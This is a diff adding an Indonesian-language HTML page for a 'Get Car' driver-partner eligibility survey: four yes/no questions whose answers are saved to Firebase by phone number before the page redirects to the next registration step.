@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+<meta name="theme-color" content="#0a1628" />
+<title>Get Car Mitra — Survey Driver</title>
+
+<!-- 🔤 Font -->
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+
+<!-- 🔥 Firebase -->
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+<!-- 📷 Cek foto latar — jika gagal dimuat, tetap pakai gradasi navy -->
+<script>
+  const BG_URL = "https://images.unsplash.com/photo-1449965408869-eaa3f722e40d?auto=format&fit=crop&w=1600&q=80";
+  const bg = new Image();
+  bg.onload = () => document.body.classList.add("has-photo");
+  bg.src = BG_URL;
+</script>
+
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  :root {
+    --navy: #0a1628;
+    --accent: #2f7bff;
+    --accent-deep: #0f5ae0;
+    --white: #ffffff;
+    --glass: rgba(255, 255, 255, 0.10);
+    --glass-border: rgba(255, 255, 255, 0.22);
+  }
+
+  html, body { height: 100%; }
+
+  body {
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    background: var(--navy);
+    color: var(--white);
+    display: flex;
+    justify-content: center;
+    overflow: hidden;
+  }
+
+  /* 🔹 Ukuran handphone, di komputer tetap di tengah */
+  .phone { width: 100%; max-width: 430px; height: 100dvh; overflow: hidden; }
+
+  .hero {
+    position: relative;
+    height: 100%;
+    display: flex;
+    flex-direction: column;
+    background: linear-gradient(160deg, #0d1f3c 0%, #0a1628 55%, #060d1a 100%);
+    overflow: hidden;
+  }
+
+  body.has-photo .hero {
+    background-image:
+      linear-gradient(180deg, rgba(6,13,26,0.80) 0%, rgba(6,13,26,0.85) 50%, rgba(6,13,26,0.95) 100%),
+      url("https://images.unsplash.com/photo-1449965408869-eaa3f722e40d?auto=format&fit=crop&w=1600&q=80");
+    background-size: cover;
+    background-position: center;
+  }
+
+  /* ✨ Cahaya aksen biru */
+  .glow { position: absolute; border-radius: 50%; filter: blur(90px); pointer-events: none; }
+  .glow-1 { width: 320px; height: 320px; background: rgba(47,123,255,0.28); top: -100px; right: -100px; }
+  .glow-2 { width: 280px; height: 280px; background: rgba(47,123,255,0.16); bottom: 60px; left: -120px; }
+
+  /* 🔹 Navbar */
+  .navbar {
+    position: relative;
+    display: flex;
+    align-items: center;
+    padding: calc(14px + env(safe-area-inset-top)) 20px 14px;
+    z-index: 10;
+  }
+
+  .back-btn {
+    width: 38px; height: 38px;
+    display: flex; align-items: center; justify-content: center;
+    border-radius: 12px;
+    background: rgba(255,255,255,0.10);
+    border: 1px solid rgba(255,255,255,0.18);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    color: var(--white);
+    cursor: pointer;
+    transition: transform 0.15s ease, background 0.2s ease;
+  }
+  .back-btn:hover  { background: rgba(255,255,255,0.18); }
+  .back-btn:active { transform: scale(0.92); }
+  .back-btn svg { width: 18px; height: 18px; }
+
+  .brand {
+    position: absolute;
+    left: 50%;
+    transform: translateX(-50%);
+    font-size: 15px;
+    font-weight: 800;
+    letter-spacing: 0.5px;
+    white-space: nowrap;
+    color: var(--white);
+  }
+  .brand span { color: var(--accent); }
+
+  .version {
+    margin-left: auto;
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 0.4px;
+    color: rgba(255,255,255,0.85);
+    background: rgba(255,255,255,0.12);
+    border: 1px solid rgba(255,255,255,0.18);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    padding: 5px 12px;
+    border-radius: 20px;
+  }
+
+  /* 🔹 Progress segmen */
+  .progress-wrap {
+    position: relative;
+    z-index: 10;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 4px 26px 0;
+  }
+
+  .progress-count {
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 0.5px;
+    color: rgba(255,255,255,0.85);
+    white-space: nowrap;
+  }
+  .progress-count b {
+    color: var(--white);
+    font-weight: 800;
+  }
+
+  .progress-track {
+    flex: 1;
+    display: flex;
+    gap: 6px;
+  }
+
+  .seg {
+    flex: 1;
+    height: 6px;
+    border-radius: 6px;
+    background: rgba(255,255,255,0.14);
+    overflow: hidden;
+    transition: background 0.4s ease;
+  }
+  .seg::after {
+    content: "";
+    display: block;
+    height: 100%;
+    width: 0%;
+    border-radius: 6px;
+    background: linear-gradient(90deg, var(--accent), #6db3ff);
+    box-shadow: 0 0 10px rgba(47,123,255,0.6);
+    transition: width 0.45s cubic-bezier(0.22, 1, 0.36, 1);
+  }
+  .seg.isi::after    { width: 100%; }
+  .seg.sekarang::after {
+    width: 100%;
+    animation: denyut 1.4s ease-in-out infinite;
+  }
+
+  /* 🔹 Konten */
+  .content {
+    position: relative;
+    z-index: 10;
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    padding: 6px 26px calc(20px + env(safe-area-inset-bottom));
+    overflow-y: auto;
+  }
+
+  .eyebrow {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: rgba(255,255,255,0.75);
+    margin: 22px 0 10px;
+  }
+  .eyebrow::before {
+    content: "";
+    width: 22px;
+    height: 2px;
+    background: var(--accent);
+    border-radius: 2px;
+  }
+
+  h1 {
+    font-size: clamp(22px, 6vw, 28px);
+    font-weight: 800;
+    line-height: 1.2;
+    letter-spacing: -0.5px;
+    margin-bottom: 8px;
+    text-shadow: 0 2px 20px rgba(0,0,0,0.35);
+  }
+  h1 span {
+    background: linear-gradient(90deg, #6db3ff, #2f7bff);
+    -webkit-background-clip: text;
+    background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+
+  /* 🔹 Kartu pertanyaan — kaca buram */
+  .question-card {
+    background: var(--glass);
+    border: 1px solid var(--glass-border);
+    backdrop-filter: blur(20px) saturate(140%);
+    -webkit-backdrop-filter: blur(20px) saturate(140%);
+    border-radius: 24px;
+    padding: 26px 22px;
+    box-shadow: 0 20px 50px rgba(0,0,0,0.35);
+  }
+
+  .question-text {
+    font-size: 17px;
+    font-weight: 700;
+    line-height: 1.5;
+    letter-spacing: -0.2px;
+    margin-bottom: 22px;
+    min-height: 52px; /* biar tinggi stabil antar pertanyaan */
+  }
+
+  /* 🔹 Opsi jawaban — radio circle custom */
+  .options { display: flex; flex-direction: column; gap: 12px; }
+
+  .option {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 16px;
+    border-radius: 16px;
+    background: rgba(255,255,255,0.06);
+    border: 1.5px solid rgba(255,255,255,0.18);
+    cursor: pointer;
+    user-select: none;
+    transition: background 0.25s ease, border-color 0.25s ease, transform 0.15s ease, box-shadow 0.25s ease;
+  }
+  .option:hover  { background: rgba(255,255,255,0.12); border-color: rgba(47,123,255,0.45); }
+  .option:active { transform: scale(0.97); }
+  .option.selected {
+    background: rgba(47,123,255,0.16);
+    border-color: var(--accent);
+    box-shadow: 0 0 20px rgba(47,123,255,0.35);
+  }
+
+  .radio-circle {
+    width: 24px; height: 24px;
+    flex-shrink: 0;
+    border-radius: 50%;
+    border: 2px solid rgba(255,255,255,0.35);
+    background: rgba(255,255,255,0.06);
+    position: relative;
+    transition: border-color 0.25s ease, background 0.25s ease, box-shadow 0.25s ease;
+  }
+  .option.selected .radio-circle {
+    border-color: var(--accent);
+    background: var(--accent);
+    box-shadow: 0 0 14px rgba(47,123,255,0.6);
+  }
+  .radio-circle::after {
+    content: "";
+    position: absolute;
+    inset: 0;
+    margin: auto;
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--white);
+    opacity: 0;
+    transform: scale(0.3);
+    transition: opacity 0.2s ease, transform 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
+  }
+  .option.selected .radio-circle::after {
+    opacity: 1;
+    transform: scale(1);
+  }
+
+  .option-label {
+    font-size: 15px;
+    font-weight: 700;
+    letter-spacing: 0.2px;
+  }
+  .option-sub {
+    display: block;
+    font-size: 12px;
+    font-weight: 500;
+    color: rgba(255,255,255,0.55);
+    margin-top: 2px;
+  }
+
+  /* 🔹 Petunjuk kecil */
+  .hint {
+    text-align: center;
+    font-size: 12px;
+    color: rgba(255,255,255,0.45);
+    margin-top: 18px;
+    animation: fadeUp 0.7s 0.5s ease both;
+  }
+
+  .copyright {
+    margin-top: auto;
+    padding-top: 20px;
+    text-align: center;
+    font-size: 11px;
+    color: rgba(255,255,255,0.45);
+    user-select: none;
+  }
+
+  /* 🔹 Popup Gagal — bottom sheet kaca */
+  .popup-overlay {
+    position: fixed;
+    inset: 0;
+    z-index: 100;
+    background: rgba(3, 8, 18, 0.70);
+    backdrop-filter: blur(5px);
+    -webkit-backdrop-filter: blur(5px);
+    display: flex;
+    align-items: flex-end;
+    justify-content: center;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.3s ease;
+  }
+  .popup-overlay.active { opacity: 1; pointer-events: auto; }
+
+  .popup-content {
+    width: 100%;
+    max-width: 430px;
+    background: rgba(13, 27, 50, 0.94);
+    border: 1px solid var(--glass-border);
+    border-bottom: none;
+    backdrop-filter: blur(24px) saturate(150%);
+    -webkit-backdrop-filter: blur(24px) saturate(150%);
+    border-radius: 24px 24px 0 0;
+    padding: 26px 24px calc(24px + env(safe-area-inset-bottom));
+    box-shadow: 0 -12px 50px rgba(0,0,0,0.5);
+    transform: translateY(100%);
+    transition: transform 0.35s cubic-bezier(0.22, 1, 0.36, 1);
+    text-align: center;
+  }
+  .popup-overlay.active .popup-content { transform: translateY(0); }
+
+  .popup-handle {
+    width: 44px; height: 4px;
+    border-radius: 4px;
+    background: rgba(255,255,255,0.25);
+    margin: 0 auto 20px;
+  }
+
+  .popup-icon {
+    width: 64px; height: 64px;
+    margin: 0 auto 16px;
+    border-radius: 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: rgba(255, 90, 90, 0.14);
+    border: 1px solid rgba(255, 90, 90, 0.35);
+    box-shadow: 0 0 26px rgba(255, 90, 90, 0.25);
+    animation: popIn 0.4s 0.15s ease both;
+  }
+  .popup-icon svg { width: 30px; height: 30px; color: #ff7b7b; }
+
+  .popup-title {
+    font-size: 19px;
+    font-weight: 800;
+    letter-spacing: -0.3px;
+    margin-bottom: 8px;
+  }
+
+  .popup-desc {
+    font-size: 14px;
+    line-height: 1.6;
+    color: rgba(255,255,255,0.75);
+    margin-bottom: 22px;
+  }
+
+  /* 🔹 Tombol */
+  .btn {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    width: 100%;
+    padding: 15px;
+    border: none;
+    border-radius: 16px;
+    font-family: inherit;
+    font-size: 15px;
+    font-weight: 700;
+    letter-spacing: 0.2px;
+    cursor: pointer;
+    transition: transform 0.15s ease, box-shadow 0.25s ease, background 0.25s ease;
+  }
+  .btn:active { transform: scale(0.97); }
+  .btn svg { width: 18px; height: 18px; flex-shrink: 0; }
+
+  .btn-primary {
+    background: linear-gradient(135deg, var(--accent), var(--accent-deep));
+    color: var(--white);
+    box-shadow: 0 8px 24px rgba(47,123,255,0.4);
+  }
+  .btn-primary:hover { box-shadow: 0 10px 30px rgba(47,123,255,0.55); }
+
+  /* 🔹 Animasi */
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(24px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  @keyframes popIn {
+    from { opacity: 0; transform: scale(0.5); }
+    to   { opacity: 1; transform: scale(1); }
+  }
+  @keyframes denyut {
+    0%, 100% { opacity: 1; }
+    50%      { opacity: 0.45; }
+  }
+
+  .navbar        { animation: fadeUp 0.6s ease both; }
+  .progress-wrap { animation: fadeUp 0.6s 0.15s ease both; }
+  .eyebrow       { animation: fadeUp 0.7s 0.25s ease both; }
+  h1             { animation: fadeUp 0.7s 0.35s ease both; }
+  .question-card { animation: fadeUp 0.7s 0.45s ease both; }
+  .copyright     { animation: fadeUp 0.7s 0.6s ease both; }
+
+  /* Transisi ganti pertanyaan */
+  .question-card.ganti {
+    animation: gantiKartu 0.4s ease both;
+  }
+  @keyframes gantiKartu {
+    0%   { opacity: 1;  transform: translateX(0); }
+    45%  { opacity: 0;  transform: translateX(-30px); }
+    55%  { opacity: 0;  transform: translateX(30px); }
+    100% { opacity: 1;  transform: translateX(0); }
+  }
+
+  @media (max-width: 360px) {
+    .content { padding-left: 20px; padding-right: 20px; }
+    .progress-wrap { padding-left: 20px; padding-right: 20px; }
+    .question-card { padding: 22px 18px; }
+  }
+</style>
+</head>
+<body>
+
+  <div class="phone">
+    <div class="hero">
+
+      <div class="glow glow-1"></div>
+      <div class="glow glow-2"></div>
+
+      <!-- 🔹 Navbar -->
+      <nav class="navbar">
+        <button class="back-btn" onclick="history.back()" aria-label="Kembali">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5"/><polyline points="12 19 5 12 12 5"/></svg>
+        </button>
+        <div class="brand">Get <span>Car</span></div>
+        <div class="version">V1.103.1</div>
+      </nav>
+
+      <!-- 🔹 Progress Segmen -->
+      <div class="progress-wrap">
+        <div class="progress-count">Pertanyaan <b id="countNow">1</b>/4</div>
+        <div class="progress-track" id="progressTrack">
+          <div class="seg" id="seg0"></div>
+          <div class="seg" id="seg1"></div>
+          <div class="seg" id="seg2"></div>
+          <div class="seg" id="seg3"></div>
+        </div>
+      </div>
+
+      <!-- 🔹 Konten -->
+      <div class="content">
+        <div class="eyebrow">Kriteria Mitra Driver</div>
+        <h1>Jawab Pertanyaan <span>Berikut</span></h1>
+
+        <!-- 🔹 Kartu Pertanyaan -->
+        <div class="question-card" id="questionCard">
+          <div class="question-text" id="questionText"></div>
+
+          <div class="options" id="optionsContainer">
+            <!-- Opsi dirender oleh JavaScript -->
+          </div>
+        </div>
+
+        <p class="hint">Jawabanmu digunakan untuk memastikan kelayakan pendaftaran.</p>
+
+        <div class="copyright">Hak Cipta © PT Bali Global Trans</div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- 🔹 Popup Gagal -->
+  <div id="popupFail" class="popup-overlay">
+    <div class="popup-content">
+      <div class="popup-handle"></div>
+
+      <div class="popup-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+      </div>
+
+      <div class="popup-title">Maaf, Belum Memenuhi Syarat</div>
+      <p class="popup-desc">Berdasarkan jawabanmu, pendaftaran saat ini tidak dapat dilanjutkan.<br>Silakan cek kembali kriteria atau hubungi admin.</p>
+
+      <button id="btnBackToStart" class="btn btn-primary">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5"/><polyline points="12 19 5 12 12 5"/></svg>
+        Kembali ke Halaman Awal
+      </button>
+    </div>
+  </div>
+
+<script>
+  // ================= KONFIGURASI FIREBASE =================
+  const firebaseConfig = {
+    apiKey: "AIzaSyD3FQbFF5a91MlASpqImTMmGkYvaTcdxm0",
+    authDomain: "kadek-ed34e.firebaseapp.com",
+    databaseURL: "https://kadek-ed34e-default-rtdb.firebaseio.com",
+    projectId: "kadek-ed34e",
+    storageBucket: "kadek-ed34e.firebasestorage.app",
+    messagingSenderId: "65756136303",
+    appId: "1:65756136303:web:6dbe5bc658fadb05ca1e9a",
+    measurementId: "G-5WSR57JC7V"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+
+  // ================= DATA PERTANYAAN =================
+  const questions = [
+    { id: "q1", text: "Apakah Anda berusia 18 – 60 tahun?", sub: { ya: "Sesuai kriteria usia", tidak: "Di luar rentang usia" } },
+    { id: "q2", text: "Apakah Anda memiliki E-KTP dan SIM A yang masih berlaku?", sub: { ya: "Dokumen lengkap", tidak: "Dokumen tidak lengkap" } },
+    { id: "q3", text: "Apakah usia kendaraan yang Anda gunakan di bawah 12 tahun?", sub: { ya: "Kendaraan layak", tidak: "Kendaraan terlalu tua" } },
+    { id: "q4", text: "Apakah Anda memiliki rekening bank atas nama sendiri?", sub: { ya: "Siap untuk pembayaran", tidak: "Belum punya rekening" } }
+  ];
+
+  // ================= ELEMEN =================
+  const questionTextEl = document.getElementById("questionText");
+  const optionsEl      = document.getElementById("optionsContainer");
+  const questionCardEl = document.getElementById("questionCard");
+  const countNowEl     = document.getElementById("countNow");
+  const segs           = [
+    document.getElementById("seg0"),
+    document.getElementById("seg1"),
+    document.getElementById("seg2"),
+    document.getElementById("seg3")
+  ];
+  const popupFail     = document.getElementById("popupFail");
+  const btnBackToStart = document.getElementById("btnBackToStart");
+
+  // ================= STATE =================
+  let currentIndex = 0;
+  let jawaban = {};       // { q1: "Ya", q2: "Tidak", ... }
+  let terkunci = false;   // cegah dobel-klik saat transisi
+
+  // Bawa nomor telepon dari URL agar alur tetap tersambung
+  const params = new URLSearchParams(window.location.search);
+  const telepon = params.get("telepon");
+
+  // ================= UPDATE PROGRESS BAR =================
+  function updateProgress() {
+    segs.forEach((seg, i) => {
+      seg.classList.remove("isi", "sekarang");
+      if (i < currentIndex) seg.classList.add("isi");
+      else if (i === currentIndex) seg.classList.add("sekarang");
+    });
+    countNowEl.textContent = currentIndex + 1;
+  }
+
+  // ================= RENDER PERTANYAAN =================
+  function renderQuestion() {
+    terkunci = false;
+    const q = questions[currentIndex];
+    questionTextEl.textContent = q.text;
+    optionsEl.innerHTML = "";
+
+    ["Ya", "Tidak"].forEach(pilihan => {
+      const opsi = document.createElement("div");
+      opsi.className = "option";
+      opsi.innerHTML = `
+        <div class="radio-circle"></div>
+        <div>
+          <span class="option-label">${pilihan}</span>
+          <span class="option-sub">${q.sub[pilihan.toLowerCase()] || ""}</span>
+        </div>
+      `;
+      opsi.addEventListener("click", () => pilihJawaban(pilihan, opsi));
+      optionsEl.appendChild(opsi);
+    });
+
+    updateProgress();
+  }
+
+  // ================= PILIH JAWABAN =================
+  function pilihJawaban(pilihan, opsiEl) {
+    if (terkunci) return;
+    terkunci = true;
+
+    // Tandai opsi yang dipilih
+    optionsEl.querySelectorAll(".option").forEach(o => o.classList.remove("selected"));
+    opsiEl.classList.add("selected");
+
+    // Simpan jawaban
+    jawaban[questions[currentIndex].id] = pilihan;
+
+    // Sedikit jeda agar user melihat pilihannya, lalu lanjut
+    setTimeout(() => {
+      if (currentIndex < questions.length - 1) {
+        currentIndex++;
+        // Animasi slide kartu saat ganti pertanyaan
+        questionCardEl.classList.remove("ganti");
+        void questionCardEl.offsetWidth;
+        questionCardEl.classList.add("ganti");
+        renderQuestion();
+      } else {
+        selesaiSurvey();
+      }
+    }, 450);
+  }
+
+  // ================= SELESAI → CEK HASIL =================
+  function selesaiSurvey() {
+    const adaTidak = Object.values(jawaban).some(v => v === "Tidak");
+
+    // Simpan hasil survey ke Firebase (jika nomor dikenal)
+    const dataSurvey = {
+      jawaban: jawaban,
+      hasil: adaTidak ? "gagal" : "lolos",
+      waktu: new Date().toISOString()
+    };
+
+    if (telepon) {
+      db.ref("pendaftaran")
+        .orderByChild("telepon")
+        .equalTo(telepon)
+        .once("value")
+        .then(snap => {
+          snap.forEach(child => {
+            child.ref.update({ survey: dataSurvey, status: "survey_selesai" });
+          });
+        })
+        .catch(err => console.warn("Gagal simpan survey:", err.message));
+    }
+
+    if (adaTidak) {
+      // ❌ Ada jawaban Tidak → popup gagal
+      setTimeout(() => popupFail.classList.add("active"), 300);
+    } else {
+      // ✅ Semua Ya → lanjut ke halaman kendaraan
+      setTimeout(() => {
+        const tujuan = "kendaraan.html" +
+          (telepon ? "?telepon=" + encodeURIComponent(telepon) : "");
+        window.location.href = tujuan;
+      }, 600);
+    }
+  }
+
+  // ================= TOMBOL POPUP GAGAL =================
+  btnBackToStart.addEventListener("click", () => {
+    popupFail.classList.remove("active");
+    // Reset dan mulai ulang
+    setTimeout(() => {
+      jawaban = {};
+      currentIndex = 0;
+      renderQuestion();
+      window.location.href = "index.html";
+    }, 350);
+  });
+
+  // ================= MULAI =================
+  renderQuestion();
+</script>
+
+</body>
+</html>
